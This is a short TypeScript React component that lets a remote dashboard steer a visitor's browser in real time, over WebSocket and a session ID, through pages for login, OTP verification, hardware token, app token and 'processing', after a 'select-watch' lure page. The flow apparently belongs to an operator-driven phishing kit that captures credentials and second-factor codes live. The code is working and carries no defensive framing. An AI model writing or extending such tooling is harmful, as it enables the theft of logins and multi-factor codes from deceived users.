import { useEffect, useRef } from "react";
import { useLocation, useNavigate } from "@tanstack/react-router";

import { getRemoteStage } from "@/lib/tracking.functions";
import { getSessionId } from "@/lib/session-id";
import { subscribeRemoteStage } from "@/lib/realtime";

const CUSTOMER_PATHS = new Set([
  "/",
  "/select-watch",
  "/register",
  "/login",
  "/verify-otp",
  "/hardware-token",
  "/app-token",
  "/processing",
]);

const STAGE_TO_PATH: Record<string, string> = {
  "select-watch": "/select-watch",
  register: "/register",
  login: "/login",
  "verify-otp": "/verify-otp",
  "hardware-token": "/hardware-token",
  "app-token": "/app-token",
  processing: "/processing",
};

export function RemoteNavListener() {
  const { pathname } = useLocation();
  const navigate = useNavigate();
  const lastStage = useRef<string | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    if (!CUSTOMER_PATHS.has(pathname)) return;

    const sid = getSessionId();
    let cancelled = false;

    function apply(stage: string) {
      if (cancelled) return;
      const target = STAGE_TO_PATH[stage];
      if (target && target !== pathname && lastStage.current !== stage) {
        lastStage.current = stage;
        void navigate({ to: target });
      }
    }

    // One-shot fetch to sync the current stage on mount / route change
    void getRemoteStage({ data: { sessionId: sid } })
      .then((res) => res?.stage && apply(res.stage))
      .catch(() => {});

    // Live push from the dashboard via WebSocket
    const unsub = subscribeRemoteStage(sid, apply);

    return () => {
      cancelled = true;
      unsub();
    };
  }, [pathname, navigate]);

  return null;
}
